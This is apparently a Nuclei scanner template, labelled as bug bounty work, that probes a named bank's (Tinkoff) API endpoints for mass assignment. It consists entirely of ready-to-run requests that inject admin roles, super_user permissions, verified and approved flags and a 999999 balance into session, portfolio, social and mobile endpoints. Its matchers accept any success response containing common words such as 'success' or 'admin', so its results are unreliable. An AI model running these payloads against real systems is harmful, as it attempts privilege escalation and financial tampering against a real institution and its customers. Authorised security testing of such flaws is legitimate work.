id: tinkoff-mass-assignment

info:
  name: Tinkoff - Mass Assignment Vulnerabilities
  author: bugbounty
  severity: high
  description: Mass assignment in API endpoints
  tags: mass-assignment,tinkoff

http:
  - raw:
      - |
        POST /api/common/v1/session_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":"web","sessionid":"test","isAdmin":true,"role":"admin"}

      - |
        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"tickers":"AAPL","verified":true,"approved":true,"balance":999999}

      - |
        POST /api/invest-gw/social/v1/post HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"content":"test","isVerified":true,"isPremium":true,"role":"moderator"}

      - |
        PUT /api/common/v1/mobile_info HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"platform":"android","sessionid":"test","permissions":["admin","super_user"]}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        part: body
        words:
          - "success"
          - "admin"
          - "verified"
          - "approved"
        condition: or
